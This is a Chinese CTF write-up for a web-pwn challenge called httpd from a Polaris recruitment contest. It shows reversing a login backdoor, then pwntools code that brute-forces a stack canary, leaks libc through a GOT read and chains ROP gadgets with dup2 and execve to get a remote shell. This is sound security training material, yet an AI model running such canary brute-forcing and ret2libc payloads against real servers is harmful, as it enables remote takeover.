---
title: web-pwn初探 Polaris招新httpd
date: 2026-09-08
tags: [CTF, PWN]
---

![](/images/posts/Pasted%20image%2020260903105752.png)
进入浏览器看看
![](/images/posts/Pasted%20image%2020260903105725.png)
随便试了试账号密码登录不进去
先逆向一下
![](/images/posts/Pasted%20image%2020260903105950.png)
fd_1接受请求体
login.html里的请求体，方式是POST
![](/images/posts/Pasted%20image%2020260903110040.png)
账号密码url编码，同时提示我们找/login

fork创建子进程，sub_401a24里应该是主要验证逻辑，处理fd_1请求体
![](/images/posts/Pasted%20image%2020260903110117.png)
分为GET和POST
![](/images/posts/Pasted%20image%2020260903110239.png)
登录我们主要看POST
` sub_401C58(fd, (char *)s);` 应该是处理请求体，处理完存在s里

这个看上下文s1应该是分离出请求路径
![](/images/posts/Pasted%20image%2020260903152304.png)
这里200应该是登录成功
![](/images/posts/Pasted%20image%2020260903110514.png)
![](/images/posts/Pasted%20image%2020260903110637.png)

看看条件验证函数里
![](/images/posts/Pasted%20image%2020260903110744.png)
这里提取请求体里的username和password存在v3，提取完分别跟s2和s2+32比较
而s2是全局变量token，说明账号密码是硬编码在ELF文件里的，我们看看如何编码的
![](/images/posts/Pasted%20image%2020260903110953.png)
![](/images/posts/Pasted%20image%2020260903111004.png)
username就是admin
密码在 `sub_402E52` 里生成
![](/images/posts/Pasted%20image%2020260903111220.png)
看到rand，srand是跟时间有关，刚开始想的是时间戳爆破，后面才发现其实有登录后门


这里居然可以直接得到cookie，同时直接登录
![](/images/posts/Pasted%20image%2020260903152540.png)
![](/images/posts/Pasted%20image%2020260903154340.png)
只需要访问
`http://localhost:9999/getCookie` 就可以登录了
![](/images/posts/Pasted%20image%2020260903154437.png)

后台可以改密码，或者配置路由，根据之前分析我们知道密码是全局变量，利用比较困难，看看路由配置里有没有栈溢出
![](/images/posts/Pasted%20image%2020260903155651.png)
路由配置找/config
这里
![](/images/posts/Pasted%20image%2020260903155729.png)
进入sub_4035a0
![](/images/posts/Pasted%20image%2020260903155841.png)
可以看到所有配置信息都是保存在栈上的，当让可以栈溢出打ROP了

注意到一开始是有fork的，可以爆破canary
我们用pwntools得还原请求体
bp抓包看看
![](/images/posts/Pasted%20image%2020260903161213.png)
请求头 `GET /getCookie HTTP/1.1\r\n`

```python
p.send(b'GET /getCookie HTTP/1.1\r\n')
p.interactive()
```
返回
![](/images/posts/Pasted%20image%2020260903161727.png)
接收cookie
```python
cookie = p.recvuntil(b';',drop=True).decode()
log.info(f'cookie : {cookie}')
```

随后我们需要爆破canary
先看看config的请求包长啥样
![](/images/posts/Pasted%20image%2020260903164317.png)
我们需要构造的请求是，因为要爆破所以选择close
```
POST /config HTTP/1.1
Host: localhost:9999
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Content-Length: 
Cookie: 
Connection: close

body
```
我们写个函数来构造请求包
```python
def post(cookie,payload):
    r = remote(HOST, PORT, level='error')
    pay = quote(payload).encode()
    body = b'route_name=TEA-ROUTER&ip=192.168.31.1&subnet_mask=255.255.255.0&gateway='+pay
    '''
        POST /config HTTP/1.1
        Host: localhost:9999
        Content-Type: application/x-www-form-urlencoded;charset=UTF-8
        Content-Length:
        Cookie:
        Connection: close
        body
    '''
    header = (
        f'POST /config HTTP/1.1\r\n'
        f'Host: {HOST}:{PORT}\r\n'
        f'Cookie: {cookie}\r\n'
        f'Content-Type: application/x-www-form-urlencoded;charset=UTF-8\r\n'
        f'Content-Length: {len(body)}\r\n'
        f'Connection: close\r\n\r\n'
    ).encode()
    r.send(header+body)
    return r.recvall()
```


![](/images/posts/Pasted%20image%2020260903170248.png)
容易算出到canary的偏移为40
可以写爆破脚本
```python
log.info(f'exploit canary')
canary = b'\x00'
for i in range(7):
    for b in range(256):
        payload = b"A" * 40 + canary + bytes([b])
        if b"500" not in post(cookie, payload):
            canary += bytes([b])
            break
canary = u64(canary)
print(f"canary: {hex(canary)}")
```
![](/images/posts/Pasted%20image%2020260903173303.png)

接下来打ROP就行
题目没有给libc，我们需要泄露libc地址然后找到对应libc版本
接下来打远程，泄露libc

![](/images/posts/Pasted%20image%2020260904113301.png)
我们发现这个write可以控制rdx，如果我们把rax设为很大的数，就可以泄露从栈上开始的数据
![](/images/posts/Pasted%20image%2020260904113503.png)
![](/images/posts/Pasted%20image%2020260904113549.png)
这里可以把eax设为很大的数
![](/images/posts/Pasted%20image%2020260904114135.png)
可以知道我们如果栈溢出调用这个write，会从canary开始往高地址泄露数据，那么我们在rbp上放想要泄露的地址的指针，也就是got表上任意的，比如我选择printf@got
```python
payload = b'a'*40 + p64(canary) + b'\x00'*16 + p64(e.got['printf']+8) +p64(add_eax) + p64(write_addr)
```
我们调试到这个溢出点：
![](/images/posts/Pasted%20image%2020260904164511.png)
额发现不对，rbp应该放是指向printf@got的指针然后+8
![](/images/posts/Pasted%20image%2020260904170146.png)
这时候就对了，可以获得libc了

现在打远程，泄露printf的libc
![](/images/posts/Pasted%20image%2020260904172228.png)

再来个read
![](/images/posts/Pasted%20image%2020260904174856.png)
libc.rip里
![](/images/posts/Pasted%20image%2020260904174955.png)
下一个8.7

随后就是getshell了，本地先测试
![](/images/posts/Pasted%20image%2020260908135458.png)
![](/images/posts/Pasted%20image%2020260908135516.png)
![](/images/posts/Pasted%20image%2020260908135616.png)
可以看到rdi，rsi，rdx等都可以控制
![](/images/posts/Pasted%20image%2020260908135759.png)
还有execve可以用，我们直接用execve，省的system要对齐
```python
execve_addr = libc_base + 0x0000000000eef30  
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
pop_rdiaddr = libc_base + 0x000000000010f78b
pop_rsiaddr = libc_base + 0x0000000000110a7d
pop_rdxaddr = libc_base + 0x00000000000b505c
payload = b'a'*40 + p64(canary) + b'\x00'*24
payload += p64(pop_rdiaddr) + p64(bin_sh_addr)
payload += p64(pop_rsiaddr) + p64(0)
payload += p64(pop_rdxaddr)
payload += p64(0)        # rdx = 0
payload += p64(0)        # rbx
payload += p64(0)        # r12
payload += p64(0)        # r13
payload += p64(0)        # rbp
payload += p64(execve_addr)
```
然后我们运行
![](/images/posts/Pasted%20image%2020260908135954.png)
shell居然弹在服务端
这不是我们想要的，需要重定向
下断点看看socket端的fd是什么
![](/images/posts/Pasted%20image%2020260908140628.png)
这里的v6就是，或者查看fd，在sub_401a24下断点，查看fd地址
![](/images/posts/Pasted%20image%2020260908140959.png)
![](/images/posts/Pasted%20image%2020260908141027.png)
fd是4，也就是我们要执行dup2(4,0);dup2(4,1);dup2(4,2)
![](/images/posts/Pasted%20image%2020260908141138.png)
rdi和rsi可控
payload改为
```python
execve_addr = libc_base + 0x0000000000eef30  
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
pop_rdiaddr = libc_base + 0x000000000010f78b
pop_rsiaddr = libc_base + 0x0000000000110a7d
pop_rdxaddr = libc_base + 0x00000000000b505c
dup2_addr   = libc_base + 0x0116990

payload = b'a'*40 + p64(canary) + b'\x00'*24
payload += p64(pop_rdiaddr) + p64(4) + p64(pop_rsiaddr) + p64(0) + p64(dup2_addr)
payload += p64(pop_rdiaddr) + p64(4) + p64(pop_rsiaddr) + p64(1) + p64(dup2_addr)
payload += p64(pop_rdiaddr) + p64(4) + p64(pop_rsiaddr) + p64(2) + p64(dup2_addr)
payload += p64(pop_rdiaddr) + p64(bin_sh_addr)
payload += p64(pop_rsiaddr) + p64(0)
payload += p64(pop_rdxaddr)
payload += p64(0)        # rdx = 0
payload += p64(0)        # rbx
payload += p64(0)        # r12
payload += p64(0)        # r13
payload += p64(0)        # rbp
payload += p64(execve_addr)
```
一直拿不到shell，有点奇怪，调试看看
![](/images/posts/Pasted%20image%2020260908142028.png)
发现子进程正常退出了，没有交互
应该在子进程r里interactive而不是p
改一下post
```python
def post(cookie,payload,debug=False,interact=False):
    if interact:
        r.interactive()
    else:
        return r.recvall()
 
post(cookie,payload,interact=True)
```
然后本地就可以打通了
![](/images/posts/Pasted%20image%2020260908142454.png)
远程也能打通
![](/images/posts/Pasted%20image%2020260908143425.png)